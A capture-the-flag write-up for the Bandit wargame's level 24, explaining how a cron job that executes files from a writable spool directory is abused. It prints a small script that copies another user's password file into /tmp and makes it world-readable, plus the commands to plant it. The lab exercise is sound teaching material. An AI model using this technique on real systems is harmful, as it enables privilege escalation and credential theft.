# Bandit Level 24 → 25

## Problem
A cron job runs every minute as bandit24. It iterates over all files in
`/var/spool/bandit24/foo`, executes them (with a 60-second timeout),
then deletes them. You can write into that directory. If you place an
executable script there, it will run **as bandit24**.

## Approach
1. `cat /usr/bin/cronjob_bandit24.sh` confirms the loop executes any
   file placed in `/var/spool/bandit24/foo`
2. Create your own script in a temp working directory:
   bash
   #!/bin/bash
   cat /etc/bandit_pass/bandit24 > /tmp/pass24
   chmod 666 /tmp/pass24
   
3. Make it executable and copy it into the spool directory
4. Wait ~60 seconds for the next cron tick
5. `cat /tmp/pass24` the password

## Wrong Turns
- Wrote the script directly inside `/var/spool/bandit24/foo` using nano,
  but forgot to `chmod +x` cron skipped it silently because it wasn't
  executable
- Put the output file in my home directory instead of `/tmp` couldn't
  read it afterward because bandit24 created it with restrictive perms;
  always add `chmod 666` on the output
- Forgot the official warning that scripts get deleted after execution
  panicked when my script vanished, not realizing that was expected behavior

## Concept Extracted
This is **code execution via writable automation paths** one of the
most common real-world privilege escalation techniques. Any scheduled
task (cron, systemd timer, Windows Task Scheduler) that runs privileged
and reads from a world-writable directory is exploitable. This exact
class of bug has earned CVEs in production software. Note also the
defense-in-depth lesson: even though the script times out and deletes
itself, the attacker only needs one successful execution to exfiltrate
data elsewhere first.

## Key Commands
- `cat /usr/bin/cronjob_bandit24.sh`
- `mktemp -d && cd $_` (safe working directory)
- `chmod 777 exploit.sh && cp exploit.sh /var/spool/bandit24/foo/`
- `sleep 65 && cat /tmp/pass24`

## Verification
Password obtained successfully and verified by SSH login as bandit25.